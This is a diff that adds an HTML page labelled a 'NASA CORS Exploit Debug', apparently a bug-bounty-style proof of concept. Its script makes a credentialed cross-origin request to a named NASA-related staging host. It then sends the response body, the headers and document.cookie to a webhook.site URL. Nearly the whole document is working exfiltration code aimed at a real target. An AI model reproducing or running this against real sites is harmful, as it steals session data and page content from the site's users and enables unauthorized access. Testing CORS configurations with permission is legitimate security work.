@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>🛰️ NASA CORS Exploit Debug</title>
+  <style>
+    body {
+      background: #000;
+      color: #0f0;
+      font-family: monospace;
+      padding: 20px;
+    }
+    .log {
+      white-space: pre-wrap;
+      background: #111;
+      padding: 10px;
+      border: 1px solid #333;
+      margin-bottom: 10px;
+    }
+  </style>
+</head>
+<body>
+  <h2>🛰️ Simulating NASA CORS Exploit (with Debug)...</h2>
+  <div id="output" class="log">Initializing...</div>
+
+  <script>
+    const output = document.getElementById('output');
+    const target = "https://datasearchstaging.globe.gov";
+    const webhook = "https://webhook.site/29f5b779-2540-4657-a365-bc504ee5c1de";
+
+    output.innerText = "📡 Fetching from: " + target + "\\n\\n";
+
+    try {
+      fetch(target, {
+        method: "GET",
+        mode: "cors",
+        credentials: "include"
+      })
+      .then(async res => {
+        output.innerText += "✅ Response Status: " + res.status + " " + res.statusText + "\\n";
+        output.innerText += "🌐 Headers:\\n";
+        res.headers.forEach((v, k) => {
+          output.innerText += "  " + k + ": " + v + "\\n";
+        });
+
+        const text = await res.text();
+        output.innerText += "\\n📄 Preview HTML:\\n" + text.slice(0, 600);
+
+        // Send to Webhook
+        fetch(webhook, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            target,
+            cookies: document.cookie,
+            html: text.slice(0, 1000),
+            headers: Object.fromEntries(res.headers.entries())
+          })
+        });
+      })
+      .catch(err => {
+        output.innerText += "❌ Fetch error:\\n" + err;
+      });
+    } catch (e) {
+      output.innerText += "🔥 Exception thrown:\\n" + e;
+    }
+  </script>
+</body>
+</html>
